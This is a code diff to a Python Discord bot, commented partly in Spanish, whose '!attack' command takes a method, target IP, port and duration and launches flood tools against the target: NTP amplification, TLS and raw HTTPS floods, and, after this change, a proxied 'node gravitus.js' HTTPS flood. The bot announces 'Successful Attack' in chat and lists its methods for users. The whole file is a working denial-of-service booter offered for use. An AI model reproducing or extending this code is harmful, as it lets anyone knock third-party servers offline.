@@ -2,6 +2,7 @@ import os
 import discord
 from discord.ext import commands
 import asyncio
+import tempfile
 
 # ========== LEER DIRECTAMENTE DE SECRET KEYS ==========
 TOKEN = os.getenv('KEYS')
@@ -16,7 +17,7 @@ if TOKEN:
     print(f"✅ Token obtenido de variable de entorno 'KEYS'")
     print(f"📏 Longitud: {token_length} caracteres")
     print(f"🔐 Vista previa: {TOKEN[:15]}...")
-    
+
     # Validar formato básico del token
     if token_length < 50:
         print(f"⚠️  Advertencia: Token muy corto ({token_length} chars)")
@@ -69,10 +70,10 @@ async def ejecutar_ataque(comando: str, ctx, ip: str, port: int, tiempo: int):
         except:
             pass
 
-@bot.command(name='attack', help='!attack {method} {ip} {port} {time}')
+@bot.command(name='attack', help='!attack {method} {ip} {port} {time} [payload]')
 async def attack(ctx, metodo: str = None, ip: str = None, port: str = None, tiempo: str = None, *, payload: str = None):
     if metodo is None or ip is None or port is None or tiempo is None:
-        await ctx.send("!attack {method} {ip} {port} {time}")
+        await ctx.send("!attack {method} {ip} {port} {time} [payload]")
         return
 
     if ip == "null" or port == "null" or tiempo == "null":
@@ -166,16 +167,17 @@ async def attack(ctx, metodo: str = None, ip: str = None, port: str = None, tiem
         await ctx.send(f'Successful Attack NTP TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')
 
     elif metodo == 'https-raw':
-      comando = f'./httpsraw {ip} {port_int} {tiempo_int}'
-      await ctx.send(f'Successful Attack HTTPs-Raw TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')
+        comando = f'./httpsraw {ip} {port_int} {tiempo_int}'
+        await ctx.send(f'Successful Attack HTTPs-Raw TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')
 
     elif metodo == 'tls':
         comando = f'./tls {ip} {port_int} {tiempo_int}'
         await ctx.send(f'Successful Attack TLS TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')
 
     elif metodo == 'https-request':
-        comando = f'./httpsrequest {ip} {port_int} {tiempo_int}'
-        await ctx.send(f'Successful Attack HTTPs-Request TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')
+        # Example: node gravitus.js <ip> <time> 30 10 proxy.txt
+        comando = f'node gravitus.js {ip} {tiempo_int} 30 10 proxy.txt'  # Adjust threads/rate as needed
+        await ctx.send(f'Successful Attack HTTPs-Request TargetIP:{ip} Time:{tiempo_int}') #Port Removed Because Is Not Needed
 
     else:
         await ctx.send('Método no encontrado, usa !methods')
@@ -212,7 +214,7 @@ Methods AMP:
 Methods L7:
 • https-raw
 • tls
-• https-request
+• https-request (proxy)
 """
     await ctx.send(methods_info)
 
